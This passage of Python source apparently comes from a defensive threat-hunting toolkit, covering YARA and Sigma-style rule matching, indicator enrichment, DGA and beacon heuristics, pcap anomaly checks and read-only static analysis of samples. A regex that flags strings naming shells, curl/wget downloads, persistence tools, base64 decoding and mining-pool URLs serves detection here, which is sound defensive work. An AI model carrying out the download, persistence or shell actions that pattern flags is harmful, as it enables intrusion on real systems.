        py_matches: list[dict] = []
        try:
            import yara  # type: ignore
            py["available"] = True
            py["version"] = getattr(yara, "__version__", "unknown")
            compiled = {os.path.splitext(f)[0]: yara.compile(filepath=os.path.join(rule_dir, f))
                        for f in sorted(os.listdir(rule_dir)) if f.endswith(".yar")}
            for target in targets:
                for ns, rules in compiled.items():
                    for m in rules.match(target):
                        py_matches.append({"rule": m.rule, "target": target,
                                           "namespace": ns, "tags": list(m.tags),
                                           "strings": [str(s) for s in (m.strings or [])][:5]})
        except ImportError:
            py["error"] = "yara-python module not installed"
        except Exception as exc:  # compile/runtime problem must be visible, not silent
            py["error"] = f"{type(exc).__name__}: {exc}"

        fixture_hits = [m for m in py_matches if m["target"] in fixtures]
        real_hits = [m for m in py_matches if m["target"] not in fixtures]
        ctx.add(Result(
            "IOC-08", "YARA rule integration", "info",
            description=(f"Wrote {len(written)} rule file(s) to {os.path.basename(rule_dir)}/ and scanned "
                         f"{len(targets)} object(s). CLI path: "
                         f"{len(cli_matches)} match(es) (yara {'present' if have('yara') else 'absent'}); "
                         f"python path: {len(py_matches)} match(es) "
                         f"({'yara-python ' + str(py.get('version')) if py['available'] else py.get('error', 'unavailable')}). "
                         f"{len(fixture_hits)} of the matches are the deterministic test fixture, "
                         f"{len(real_hits)} are on the real sample."),
            asset=", ".join(os.path.basename(t) for t in targets[:8]),
            source="local",
            evidence=[{"type": "command_output",
                       "command": " ; ".join(i["command"] for i in cli["invocations"]) or
                                  "yara (not run)",
                       "returncode": max((i["returncode"] for i in cli["invocations"]), default=-1),
                       "stdout": "\n".join(i["stdout"] for i in cli["invocations"])[-6000:],
                       "stderr": "\n".join(i["stderr"] for i in cli["invocations"])[-2000:]},
                      {"type": "other", "summary": "yara-python results",
                       "matches": py_matches, "fixtures": [os.path.basename(f) for f in fixtures],
                       "rules": written},
                      {"type": "file", "name": "yara_rules", "path": rule_dir,
                       "kind": "directory", "size": 0, "sha256": ""}],
            data={"rules": written, "targets": targets, "cli": cli,
                  "cli_matches": cli_matches, "python": py, "python_matches": py_matches,
                  "fixture_matches": len(fixture_hits), "sample_matches": len(real_hits),
                  "fixtures": fixtures}))

        if not cli_matches and not py_matches:
            ctx.add(Result(
                "IOC-08b", "YARA scan produced no match", "info",
                description=(f"All {len(written)} rules ran against {len(targets)} object(s) and matched "
                             "nothing, including the deterministic fixture - that result means the "
                             "matching path was not exercised and must be investigated, not reported "
                             "as a clean scan."),
                source="local", evidence=[{"type": "other", "summary": "no matches", "rules": written}],
                data={"rules": written}))
        if real_hits:
            ctx.add(Result(
                "IOC-08c", "Sample matched a YARA rule", "fail", severity="high",
                description="; ".join(f"{m['rule']} -> {os.path.basename(m['target'])}" for m in real_hits[:8]),
                asset=sample or "", source="local", cvss_score=7.4, cwe=["CWE-506"],
                remediation="Treat the sample as malicious until disproven: detonate only in an isolated "
                            "lab, extract the matched strings as new IOCs and hunt for them fleet-wide.",
                evidence=[{"type": "other", "summary": "sample matches", "matches": real_hits[:10]}],
                data={"sample_matches": real_hits[:10]}))

    # ------------------------------------------------------------ IOC-09 -----
    def sigma_hunting(self, ctx: Context) -> None:
        events_path = ctx.params.get("events_path")
        events: list[dict] = []
        origin = ""
        if events_path and os.path.exists(str(events_path)):
            events, bad = load_events(str(events_path))
            origin = f"operator-supplied events file {os.path.basename(str(events_path))}"
            if bad:
                ctx.add(Result("IOC-09b", "Unparsable event lines skipped", "info",
                               description=f"{bad} line(s) in {events_path} were not valid JSON and "
                                           "were skipped.",
                               source="local", data={"skipped_lines": bad}))
        if not events:
            events = host_events()
            origin = "JSONL generated from this host's live process list (psutil)"
            gen = ctx.save_text("events_generated.jsonl",
                                "\n".join(json.dumps(e) for e in events) + "\n")
        else:
            gen = artifact(str(events_path), os.path.basename(str(events_path)), "jsonl")
            # Self-test events are appended even when real events are supplied so
            # the evaluator is provably exercised on every run. They are labelled
            # source=fixture and reported separately from live matches.
            events = events + [dict(e) for e in SIGMA_FIXTURE_EVENTS]

        results: list[dict] = []
        for rule in SIGMA_RULES:
            for ev in events:
                try:
                    if sigma_match(rule, ev):
                        results.append({"rule": rule["title"], "rule_id": rule.get("id"),                                        "level": rule.get("level", "medium"),
                                        "event_source": ev.get("source", "operator"),
                                        "event": {k: ev.get(k) for k in
                                                  ("ts", "pid", "Image", "CommandLine", "ParentImage",
                                                   "User", "DestinationIp", "DestinationPort", "source")
                                                  if ev.get(k) is not None}})
                except Exception as exc:
                    results.append({"rule": rule["title"], "error": f"{type(exc).__name__}: {exc}"})

        live_results = [r for r in results if r.get("event_source") != "fixture"]
        fixture_results = [r for r in results if r.get("event_source") == "fixture"]
        table = "\n".join(f"{r['rule_id']}\t{r['level']}\t{r['event_source']}\t"
                          f"{json.dumps(r['event'])[:180]}" for r in results if "event" in r) + "\n"
        ctx.save_text("sigma_matches.tsv", table)

        ctx.add(Result(
            "IOC-09", "Sigma rule support and threat hunting", "info",
            description=(f"Evaluated {len(SIGMA_RULES)} Sigma-style rule(s) against {len(events)} event(s) "
                         f"from {origin}. {len(live_results)} match(es) on real events, "
                         f"{len(fixture_results)} on labelled fixture events. "
                         f"Supported subset: field modifiers contains/startswith/endswith/re/gt/gte/lt and "
                         f"conditions 'sel', 'all of sel_*', '1 of sel_*', 'sel_a and/or sel_b'. "
                         f"Not supported: aggregation, |count, |near, |base64offset, keyword lists, "
                         f"correlation rules."),
            asset=socket.gethostname(), source="live",
            evidence=[{"type": "other", "summary": "sigma matches", "matches": results[:40],
                       "rules": [r["title"] for r in SIGMA_RULES],
                       "events_source": origin},
                      {**gen, "type": "file"}],
            data={"rules": [r["title"] for r in SIGMA_RULES], "matches": results,
                  "events": len(events), "events_source": origin}))

        if live_results:
            ctx.add(Result(
                "IOC-09c", "Threat-hunt rule matched live host events", "fail", severity="medium",
                description="; ".join(f"{r['rule']} -> pid {r['event'].get('pid')} "
                                      f"{str(r['event'].get('CommandLine'))[:90]}"
                                      for r in live_results[:8]),
                asset=socket.gethostname(), source="live", cvss_score=5.0,
                remediation=("Containment: identify the process owner, snapshot the command line and "
                             "binary hash, kill the process tree only after preserving evidence, "
                             "remove the persistence entry, and add the parent+child pair to the "
                             "hunt list for other hosts."),
                evidence=[{"type": "other", "summary": "live matches", "matches": live_results[:20]}],
                data={"live_matches": live_results[:20]}))
        if fixture_results:
            ctx.add(Result(
                "IOC-09d", "Sigma evaluator self-test on labelled fixtures", "info",
                description=(f"{len(fixture_results)} fixture event(s) matched as designed, proving the "
                             "evaluator path executes. Fixture events are synthetic test data marked "
                             "source=fixture and carry no host evidence."),
                source="local",
                evidence=[{"type": "other", "summary": "fixture matches",
                           "matches": fixture_results[:10],
                           "fixtures": SIGMA_FIXTURE_EVENTS}],
                data={"fixture_matches": fixture_results[:10]}))


# ============================================================== ingestion ====
def raw_indicator_tokens(ctx: Context) -> list[str]:
    """Every operator-supplied token, before classification (keeps ip:port)."""
    tokens: list[str] = []
    iocs = ctx.params.get("iocs") or []
    if isinstance(iocs, str):
        iocs = re.split(r"[\s,;]+", iocs)
    tokens.extend(str(x) for x in iocs if str(x).strip())
    path = ctx.params.get("ioc_file")
    if path and os.path.exists(str(path)):
        with open(str(path), encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.split("#", 1)[0].strip()
                if not line:
                    continue
                # "type,value" CSV: keep only the value column.
                parts = [p.strip() for p in line.split(",")]
                if len(parts) == 2 and parts[0].lower() in (
                        "ip", "domain", "url", "md5", "sha1", "sha256", "email", "ip:port"):
                    tokens.append(parts[1])
                else:
                    tokens.extend(p for p in parts if p)
    tokens.extend(str(t).strip() for t in ctx.targets if str(t).strip())
    return tokens


def classify(token: str) -> tuple[str, str] | None:
    """Return (type, normalised value) or None. Order matters: most specific first."""
    t = token.strip().strip("\"'").rstrip(".,;)")
    if not t:
        return None
    low = t.lower()
    if RE_SHA256.match(t):
        return "sha256", low
    if RE_SHA1.match(t):
        return "sha1", low
    if RE_MD5.match(t):
        return "md5", low
    if low.startswith(("http://", "https://")):
        return "url", t
    if RE_EMAIL.match(t):
        return "email", low
    if RE_IP_PORT.match(t):
        return "ip:port", low          # kept distinct so the port heuristic sees it
    host = t.split("//", 1)[-1].split("/", 1)[0]
    if safe_ip(host) is not None:
        return "ip", host
    if RE_DOMAIN.match(host) and not host.replace(".", "").isdigit():
        return "domain", host.lower()
    return None


def ingest_iocs(ctx: Context) -> tuple[list[dict], list[str]]:
    """Classify, de-duplicate and provenance-tag every supplied indicator."""
    seen: dict[tuple[str, str], dict] = {}
    rejected: list[str] = []
    for token in raw_indicator_tokens(ctx):
        kind = classify(token)
        if not kind:
            rejected.append(token)
            continue
        typ, value = kind
        key = (typ, value)
        if key in seen:
            seen[key]["occurrences"] += 1
            continue
        seen[key] = {"type": typ, "value": value, "source": source_of(ctx, token),
                     "raw": token, "occurrences": 1}
    return list(seen.values()), rejected


def source_of(ctx: Context, token: str) -> str:
    iocs = ctx.params.get("iocs") or []
    if isinstance(iocs, str):
        iocs = re.split(r"[\s,;]+", iocs)
    if token in [str(x).strip() for x in iocs]:
        return "params.iocs"
    path = ctx.params.get("ioc_file")
    if path and os.path.exists(str(path)):
        try:
            with open(str(path), encoding="utf-8", errors="replace") as fh:
                if token in fh.read():
                    return f"ioc_file:{os.path.basename(str(path))}"
        except OSError:
            pass
    return "targets"


# ============================================================== utilities ====
def safe_ip(value: str):
    v = str(value).strip().strip("[]")
    try:
        return ipaddress.ip_address(v)
    except ValueError:
        return None


def domain_of(value: str) -> str:
    v = str(value).split("//", 1)[-1].split("/", 1)[0].split("?", 1)[0]
    v = v.split("@")[-1]
    if ":" in v:
        v = v.split(":", 1)[0]
    return v.lower()


def entropy(data: bytes | str) -> float:
    if not data:
        return 0.0
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    total = len(data)
    out = 0.0
    for c in counts:
        if c:
            p = c / total
            out -= p * math.log2(p)
    return round(out, 3)


def iter_log_files(paths: list[str], limit: int = 25):
    """Expand operator paths (files or dirs) into a bounded list of readable files."""
    out: list[str] = []
    for p in paths:
        if len(out) >= limit:
            break
        if os.path.isfile(p):
            out.append(p)
        elif os.path.isdir(p):
            for root, _dirs, files in os.walk(p):
                for f in sorted(files):
                    fp = os.path.join(root, f)
                    if os.path.isfile(fp) and os.path.getsize(fp) < 64 * 1024 * 1024:
                        out.append(fp)
                        if len(out) >= limit:
                            break
                if len(out) >= limit:
                    break
    return out


def search_logs(files: list[str], indicators: list[dict]) -> dict[str, dict]:
    """Literal substring search of each indicator value across the given files."""
    need = {i["value"]: i["type"] for i in indicators if i["type"] != "url"}
    # URLs are searched as their host so a log line naming only the host still hits.
    need.update({domain_of(i["value"]): i["type"] for i in indicators if i["type"] == "url"})
    hits: dict[str, dict] = {}
    for path in files:
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                for lineno, line in enumerate(fh, 1):
                    low = line.lower()
                    for value, typ in need.items():
                        if value and value.lower() in low:
                            entry = hits.setdefault(value, {"type": typ, "files": [], "lines": []})
                            if path not in entry["files"]:
                                entry["files"].append(path)
                            if len(entry["lines"]) < 5:
                                entry["lines"].append({"file": os.path.basename(path),
                                                       "line": lineno, "text": line.strip()[:220]})
        except OSError:
            continue
    return hits


def resolve_domain(name: str) -> dict:
    """Real DNS lookups via dig, with a resolver fallback."""
    rec: dict[str, Any] = {}
    if have("dig"):
        for rtype in ("A", "AAAA", "MX", "NS", "TXT"):
            res = runner.run(["dig", "+short", "+time=3", "+tries=1", rtype, name], timeout=8)
            vals = [l.strip() for l in (res.stdout or "").splitlines() if l.strip()]
            rec[rtype] = vals[:10]
    else:
        try:
            rec["A"] = sorted({ai[4][0] for ai in socket.getaddrinfo(name, None)})[:10]
        except socket.gaierror as exc:
            rec["error"] = str(exc)
    return rec


def scan_hash_roots(roots: list[str], wanted: dict[str, str],
                    max_files: int = 4000, max_size: int = 32 * 1024 * 1024) -> tuple[dict, dict]:
    """Hash real files under the given roots and compare to the wanted hashes."""
    import hashlib
    matches: dict[str, list[str]] = {}
    stats: dict[str, Any] = {"files_hashed": 0, "roots": [], "skipped": 0}
    for root in roots:
        stats["roots"].append({"path": root, "exists": os.path.exists(root)})
        if not os.path.exists(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames.sort()
            for fn in sorted(filenames):
                if stats["files_hashed"] >= max_files:
                    break
                fp = os.path.join(dirpath, fn)
                try:
                    if not os.path.isfile(fp) or os.path.islink(fp):
                        continue
                    size = os.path.getsize(fp)
                    if size > max_size:
                        stats["skipped"] += 1
                        continue
                    h256 = hashlib.sha256()
                    h1 = hashlib.sha1()
                    h5 = hashlib.md5()
                    with open(fp, "rb") as fh:
                        for chunk in iter(lambda: fh.read(1 << 20), b""):
                            h256.update(chunk)
                            h1.update(chunk)
                            h5.update(chunk)
                except OSError:
                    stats["skipped"] += 1
                    continue
                stats["files_hashed"] += 1
                digests = {"sha256": h256.hexdigest(), "sha1": h1.hexdigest(), "md5": h5.hexdigest()}
                for value, kind in wanted.items():   # wanted maps hash -> kind
                    if digests.get(kind) == value:
                        matches.setdefault(value, []).append(fp)
            if stats["files_hashed"] >= max_files:
                break
    return matches, stats


# ============================================================= enrichment ====
UA = {"User-Agent": "wd-cyber-toolkit-neo/1.0 (+ioc-enrichment)"}


def _http_json(url: str, timeout: float) -> tuple[Any, str]:
    try:
        import httpx
    except Exception as exc:
        return None, f"httpx not importable: {type(exc).__name__}"
    try:
        r = httpx.get(url, timeout=timeout, headers=UA, follow_redirects=True)
    except Exception as exc:
        return None, f"{type(exc).__name__}: {str(exc)[:160]}"
    if r.status_code != 200:
        return None, f"HTTP {r.status_code}"
    try:
        return r.json(), ""
    except Exception:
        return r.text[:800], ""


CLOUD_ORG_HINTS = ("amazon", "google", "microsoft", "azure", "digitalocean", "ovh",
                   "hetzner", "linode", "vultr", "contabo", "cloudflare", "leaseweb")


def enrich_ip(ip: str, timeout: float) -> dict:
    data, err = _http_json(f"https://ipinfo.io/{ip}/json", timeout)
    if isinstance(data, dict) and data.get("ip"):
        flags = []
        if data.get("bogon"):
            flags.append("bogon/reserved per ipinfo")
        org = str(data.get("org", "")).lower()
        if any(h in org for h in CLOUD_ORG_HINTS):
            flags.append(f"hosting/cloud ASN ({data.get('org')})")
        return {"answered": True, "source": "https://ipinfo.io", "summary":
                f"{data.get('city', '')} {data.get('region', '')} {data.get('country', '')} "
                f"{data.get('org', '')}".strip(),
                "fields": {k: data.get(k) for k in
                           ("hostname", "city", "region", "country", "org", "loc", "timezone", "bogon")},
                "flags": flags}
    # Free secondary source (no key), used only if the first did not answer.
    text, err2 = _http_json(f"https://api.hackertarget.com/geoip/?q={ip}", timeout)
    if isinstance(text, str) and text.strip() and "error" not in text.lower()[:40]:
        return {"answered": True, "source": "https://api.hackertarget.com/geoip/",
                "summary": text.strip()[:200], "fields": {"raw": text.strip()[:300]}, "flags": []}
    return {"answered": False, "source": "ipinfo.io + hackertarget geoip",
            "error": f"ipinfo: {err}; hackertarget: {err2 or 'unusable body'}", "flags": []}


def enrich_domain(name: str, timeout: float) -> dict:
    dns = resolve_domain(name)
    answered = bool(dns.get("A") or dns.get("AAAA") or dns.get("MX") or dns.get("NS"))
    flags: list[str] = []
    if not dns.get("A") and not dns.get("AAAA"):
        flags.append("no A/AAAA record (dormant, parked or sinkholed)")
    if not dns.get("MX"):
        flags.append("no MX record")
    whois_info: dict[str, Any] = {}
    if have("whois"):
        res = runner.run(["whois", name], timeout=min(int(timeout) + 8, 20))
        txt = res.stdout or ""
        created = re.search(r"(?im)^\s*(?:creation date|created|registered on|registration time)\s*:\s*(\S+)", txt)
        registrar = re.search(r"(?im)^\s*registrar\s*:\s*(.+)$", txt)
        expiry = re.search(r"(?im)^\s*(?:registry expiry date|expiry date|expiration date)\s*:\s*(\S+)", txt)
        whois_info = {"creation_date": created.group(1) if created else "",
                      "registrar": (registrar.group(1).strip()[:120] if registrar else ""),
                      "expiry_date": expiry.group(1) if expiry else "",
                      "returncode": res.returncode}
        answered = answered or bool(whois_info["registrar"] or whois_info["creation_date"])
        if whois_info["creation_date"]:
            age = days_since(whois_info["creation_date"])
            whois_info["age_days"] = age
            if age is not None and age < 30:
                flags.append(f"newly registered ({age} day(s) old) - common in malware campaigns")
    else:
        whois_info = {"error": "whois not installed"}
    return {"answered": answered, "source": "dig + whois", "dns": dns, "whois": whois_info,
            "summary": f"records={{{', '.join(f'{k}:{len(v)}' for k, v in dns.items() if isinstance(v, list))}}}",
            "flags": flags}


def days_since(stamp: str) -> int | None:
    import datetime as dt
    s = stamp.strip().rstrip("Z")
    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d", "%d-%b-%Y"):
        try:
            when = dt.datetime.strptime(s.split(".")[0], fmt).replace(tzinfo=dt.timezone.utc)
            return (dt.datetime.now(dt.timezone.utc) - when).days
        except ValueError:
            continue
    return None


def enrich_hash(value: str, api_key: str, timeout: float) -> dict:
    if not api_key:
        return {"answered": False, "source": "MalwareBazaar (mb-api.abuse.ch)",
                "error": "params.mb_api not supplied - lookup skipped, no reputation claimed",
                "flags": []}
    try:
        import httpx
    except Exception as exc:
        return {"answered": False, "source": "MalwareBazaar", "flags": [],
                "error": f"httpx not importable: {type(exc).__name__}"}
    try:
        r = httpx.post("https://mb-api.abuse.ch/api/v1/",
                       data={"query": "get_info", "hash": value},
                       headers={**UA, "Auth-Key": api_key}, timeout=timeout)
        if r.status_code != 200:
            return {"answered": False, "source": "MalwareBazaar", "flags": [],
                    "error": f"HTTP {r.status_code}"}
        body = r.json()
    except Exception as exc:
        return {"answered": False, "source": "MalwareBazaar", "flags": [],
                "error": f"{type(exc).__name__}: {str(exc)[:160]}"}
    status = body.get("query_status")
    if status != "ok":
        return {"answered": True, "source": "MalwareBazaar", "flags": [],
                "summary": f"query_status={status} (hash not present in MalwareBazaar)",
                "fields": {"query_status": status}}
    row = (body.get("data") or [{}])[0]
    flags = [f"signature={row.get('signature')}"] if row.get("signature") else []
    return {"answered": True, "source": "MalwareBazaar",
            "summary": f"{row.get('file_type', '?')} first seen {row.get('first_seen', '?')}",
            "fields": {k: row.get(k) for k in
                       ("signature", "file_type", "first_seen", "tags", "reporter", "delivery_method")},
            "flags": flags}


# ================================================================== C2/DGA ====
VOWELS = set("aeiou")
CONSONANT_RUN = re.compile(r"[^aeiou0-9-]{5,}")


def dga_shape(label: str) -> dict:
    """Stated DGA-shape heuristic. Returns the reasons, not a verdict on intent."""
    lab = label.lower()
    metrics = {"length": len(lab), "entropy": entropy(lab),
               "digit_ratio": round(sum(c.isdigit() for c in lab) / max(1, len(lab)), 3),
               "vowel_ratio": round(sum(c in VOWELS for c in lab) / max(1, len(lab)), 3)}
    run = CONSONANT_RUN.search(lab)
    metrics["max_consonant_run"] = len(run.group(0)) if run else 0
    reasons: list[str] = []
    if metrics["length"] >= 12:
        reasons.append(f"label length {metrics['length']} >= 12")
    if metrics["entropy"] >= 3.3:
        reasons.append(f"entropy {metrics['entropy']} >= 3.3")
    if metrics["max_consonant_run"] >= 5:
        reasons.append(f"consonant run {metrics['max_consonant_run']} >= 5")
    if metrics["vowel_ratio"] <= 0.35:
        reasons.append(f"vowel ratio {metrics['vowel_ratio']} <= 0.35")
    if metrics["digit_ratio"] > 0.4:
        reasons.append(f"digit ratio {metrics['digit_ratio']} > 0.4")
    if "-" in lab:
        reasons.append("contains hyphen (typical of manually chosen names)")
    dga_like = (metrics["length"] >= 12 and metrics["entropy"] >= 3.3
                and metrics["vowel_ratio"] <= 0.35 and metrics["max_consonant_run"] >= 5
                and "-" not in lab)
    return {"dga_like": dga_like, "reasons": reasons or ["within normal lexical shape"],
            "metrics": metrics}


# ================================================================ pcap work ====
def default_interface() -> str:
    res = runner.run(["ip", "route", "get", "8.8.8.8"], timeout=8)
    for line in (res.stdout or "").splitlines():
        if " dev " in line:
            return line.split(" dev ")[1].split()[0]
    return "eth0"


def pcap_connections(pcap: str) -> list[dict]:
    """Per-flow rows from tshark: (src, dst, dst_port, packet count, bytes, first ts)."""
    if not have("tshark"):
        return []
    res = runner.run(["tshark", "-r", pcap, "-T", "fields", "-E", "separator=|",
                      "-E", "occurrence=f",
                      "-e", "frame.time_epoch", "-e", "ip.src", "-e", "ip.dst",
                      "-e", "tcp.dstport", "-e", "udp.dstport", "-e", "frame.len",
                      "-e", "tcp.flags.syn", "-e", "tcp.flags.ack"], timeout=60)
    flows: dict[tuple, dict] = {}
    for line in (res.stdout or "").splitlines():
        parts = line.split("|")
        if len(parts) < 6:
            continue
        ts, src, dst, tport, uport, length = parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]
        sport = tport or uport
        if not src or not dst or not sport:
            continue
        try:
            key = (src, dst, int(sport))
        except ValueError:
            continue
        f = flows.setdefault(key, {"src_ip": src, "dst_ip": dst, "dst_port": int(sport),
                                   "packets": 0, "bytes": 0, "timestamps": [],
                                   "syn_only": 0, "total": 0})
        f["packets"] += 1
        f["total"] += 1
        try:
            f["bytes"] += int(length)
        except ValueError:
            pass
        try:
            f["timestamps"].append(float(ts))
        except ValueError:
            pass
        syn = parts[6] if len(parts) > 6 else ""
        ack = parts[7] if len(parts) > 7 else ""
        if syn in ("1", "True", "true") and ack in ("0", "False", "false", ""):
            f["syn_only"] += 1
    out = []
    for f in flows.values():
        f["timestamps"].sort()
        out.append(f)
    return out


def detect_beacons(flows: list[dict], min_conns: int = 4, max_cv: float = 0.35) -> list[dict]:
    """Beacon heuristic: repeated flows to the same dst with low inter-arrival variance."""
    out = []
    for f in flows:
        ts = f["timestamps"]
        if len(ts) < min_conns:
            continue
        gaps = [b - a for a, b in zip(ts, ts[1:]) if b - a >= 0]
        if len(gaps) < 3:
            continue
        mean = sum(gaps) / len(gaps)
        if mean < 0.5:
            continue
        var = sum((g - mean) ** 2 for g in gaps) / len(gaps)
        cv = math.sqrt(var) / mean
        if cv <= max_cv:
            out.append({"src_ip": f["src_ip"], "dst_ip": f["dst_ip"], "dst_port": f["dst_port"],
                        "connections": len(ts), "mean_interval_s": round(mean, 2),
                        "cv": round(cv, 3), "min_gap_s": round(min(gaps), 3),
                        "max_gap_s": round(max(gaps), 3)})
    return sorted(out, key=lambda x: x["cv"])[:20]


def capture_anomalies(pcap: str, ctx: Context) -> dict:
    """Fan-out, DNS tunnelling, large flows and IOC contacts from a real capture."""
    indicators, _ = ingest_iocs(ctx)
    ioc_ips = {i["value"] for i in indicators if i["type"] == "ip"}
    out: dict[str, Any] = {"pcap": pcap, "packets": 0, "fan_out": [], "dns_tunnel_candidates": [],
                           "large_flows": [], "ioc_contacts": [], "dns_names": []}
    flows = pcap_connections(pcap)
    out["flows"] = len(flows)
    count = runner.run(["tshark", "-r", pcap, "-T", "fields", "-e", "frame.number"], timeout=60)
    out["packets"] = len([l for l in (count.stdout or "").splitlines() if l.strip()])
    if have("tshark"):
        ver = runner.run(["tshark", "--version"], timeout=15)
        out["tshark_version"] = ver.as_evidence()

    # Fan-out: one source touching many dst ports/hosts.
    by_src: dict[str, dict] = {}
    for f in flows:
        s = by_src.setdefault(f["src_ip"], {"ports": set(), "dsts": set(), "syn": 0, "total": 0})
        s["ports"].add(f["dst_port"])
        s["dsts"].add(f["dst_ip"])
        s["syn"] += f["syn_only"]
        s["total"] += f["total"]
    for src, s in by_src.items():
        if len(s["ports"]) >= 10 and len(s["dsts"]) >= 1:
            out["fan_out"].append({"src_ip": src, "distinct_ports": len(s["ports"]),
                                   "distinct_dsts": len(s["dsts"]),
                                   "syn_only_ratio": round(s["syn"] / max(1, s["total"]), 3)})
    out["fan_out"].sort(key=lambda x: -x["distinct_ports"])

    # Large outbound flows (bytes) - sender is the higher-volume side.
    big = []
    for f in flows:
        if f["bytes"] >= 200000:
            big.append({"src_ip": f["src_ip"], "dst_ip": f["dst_ip"], "dst_port": f["dst_port"],
                        "bytes": f["bytes"], "packets": f["packets"]})
    out["large_flows"] = sorted(big, key=lambda x: -x["bytes"])[:10]

    # DNS tunnelling: long / high-entropy query names.
    if have("tshark"):
        dns = runner.run(["tshark", "-r", pcap, "-Y", "dns.flags.response==0",
                          "-T", "fields", "-e", "dns.qry.name"], timeout=60)
        names = [l.strip().rstrip(".") for l in (dns.stdout or "").splitlines() if l.strip()]
        out["dns_names"] = sorted(set(names))[:200]
        out["dns_query_count"] = len(names)
        cands = []
        for name in sorted(set(names)):
            label = name.split(".")[0]
            e = entropy(label)
            if len(name) >= 40 or (len(label) >= 24 and e >= 3.6):
                cands.append({"name": name, "length": len(name), "entropy": e,
                              "label_length": len(label)})
        out["dns_tunnel_candidates"] = sorted(cands, key=lambda c: -c["length"])[:15]
        # Repeated queries for the same parent domain are the stronger tunnel signal.
        parents: dict[str, int] = {}
        for name in names:
            parts = name.split(".")
            if len(parts) >= 2:
                parents[".".join(parts[-2:])] = parents.get(".".join(parts[-2:]), 0) + 1
        out["dns_parent_volume"] = sorted(
            ({"parent": k, "queries": v} for k, v in parents.items()), key=lambda x: -x["queries"])[:10]

    for f in flows:
        if f["dst_ip"] in ioc_ips or f["src_ip"] in ioc_ips:
            out["ioc_contacts"].append({"src_ip": f["src_ip"], "dst_ip": f["dst_ip"],
                                        "dst_port": f["dst_port"], "packets": f["packets"],
                                        "bytes": f["bytes"]})
    out["ioc_contacts"] = sorted(out["ioc_contacts"], key=lambda x: -x["bytes"])[:15]
    return out


# ======================================================== static analysis ====
SAMPLE_CANDIDATES = ("/usr/bin/ls", "/bin/ls", "/usr/bin/curl", "/bin/cat")


def pick_sample(ctx: Context, allow_fallback: bool = True) -> str:
    path = ctx.params.get("sample_path")
    if path and os.path.isfile(str(path)):
        return str(path)
    if not allow_fallback:
        return ""
    for cand in SAMPLE_CANDIDATES:
        if os.path.isfile(cand):
            return cand
    return ""


MAGIC = [
    (b"\x7fELF", "ELF executable/shared object"),
    (b"MZ", "PE/COFF (DOS-MZ header)"),
    (b"\xca\xfe\xba\xbe", "Mach-O / Java class (universal)"),
    (b"PK\x03\x04", "ZIP container (also docx/jar/apk)"),
    (b"%PDF", "PDF document"),
    (b"\x1f\x8b", "gzip stream"),
    (b"#!", "script with shebang"),
]

INTEREST_RE = re.compile(
    r"(https?://[^\s\"'<>]{4,200}|"
    r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b|"
    r"(?i:HKEY_[A-Z_]+\\[^\s\"']{3,120}|SOFTWARE\\\\[A-Za-z0-9_\\\\]{3,80})|"
    r"(?i:\b(?:stratum\+tcp://|cmd\.exe|powershell(?:\.exe)?|/bin/(?:ba)?sh|"
    r"curl|wget|crontab|systemd|schtasks|base64 -d)\b)|"
    r"[A-Za-z0-9+/]{40,}={0,2})")


def static_analyse(path: str) -> dict:
    """Pure-python static analysis. The sample is only read, never executed."""
    import hashlib
    size = os.path.getsize(path)
    with open(path, "rb") as fh:
        head = fh.read(1 << 20)
        fh.seek(0)
        whole = fh.read(min(size, 8 << 20))
    hashes = {"md5": hashlib.md5(whole).hexdigest(),
              "sha1": hashlib.sha1(whole).hexdigest(),
              "sha256": hashlib.sha256(whole).hexdigest()}
    file_type = next((name for sig, name in MAGIC if head.startswith(sig)), "unknown/data")
    out: dict[str, Any] = {
        "path": path, "size": size, "file_type": file_type, "hashes": hashes,
        "whole_file_entropy": entropy(whole), "sections": [], "header": {},
        "strings_of_interest": [], "notes": [],
    }
    if have("file"):
        res = runner.run(["file", "-b", path], timeout=15)
        out["file_cmd"] = res.as_evidence()
        out["file_type_cmd"] = res.stdout.strip()[:300]
    if have("strings"):
        res = runner.run(["strings", "-a", "-n", "6", path], timeout=30)
        out["strings_cmd"] = res.as_evidence()
        found: list[str] = []
        for line in (res.stdout or "").splitlines():
            for m in INTEREST_RE.finditer(line):
                cand = m.group(0)[:200]
                if cand not in found:
                    found.append(cand)
                if len(found) >= 60:
                    break
            if len(found) >= 60:
                break
        out["strings_of_interest"] = found
        out["strings_total"] = len((res.stdout or "").splitlines())

    if file_type.startswith("ELF"):
        out["header"], out["sections"] = elf_facts(path)
    elif file_type.startswith("PE"):
        out["header"], out["sections"] = pe_facts(path)

    high = [s for s in out["sections"] if s.get("entropy", 0) >= 7.2]
    if high:
        out["notes"].append("High-entropy section(s) suggest packing/encryption: "
                            + ", ".join(f"{s['name']}({s['entropy']})" for s in high[:6]))
    if out["whole_file_entropy"] >= 7.5:
        out["notes"].append(f"Whole-file entropy {out['whole_file_entropy']} >= 7.5 "
                            "(packed or compressed payload)")
    if not out["sections"] and size > 0:
        out["notes"].append("No section table parsed (unsupported format or truncated file)")
    if any("W+X" in str(s.get("flags", "")) for s in out["sections"]):
        out["notes"].append("Section(s) both writable and executable (W+X) - common in packers")
    exec_stack = out["header"].get("executable_stack")
    if exec_stack:
        out["notes"].append("Header declares an executable stack (GNU_STACK RWE)")
    if out["strings_of_interest"]:
        out["notes"].append(f"{len(out['strings_of_interest'])} indicator-like string(s) extracted")
    return out


def elf_facts(path: str) -> tuple[dict, list[dict]]:
    """ELF header + section table facts (little/big endian, 32/64 bit)."""
    import struct
    header: dict[str, Any] = {}
    sections: list[dict] = []
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        return {"error": str(exc)}, []
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return {"error": "not ELF"}, []
    ei_class, ei_data = data[4], data[5]
    is64 = ei_class == 2
    endian = "<" if ei_data == 1 else ">"
    header["class"] = "ELF64" if is64 else "ELF32"
    header["endianness"] = "little" if ei_data == 1 else "big"
    header["osabi"] = data[7]
    try:
        if is64:
            (e_type, e_machine, _ver, e_entry, e_phoff, e_shoff, _flags, _ehsize,
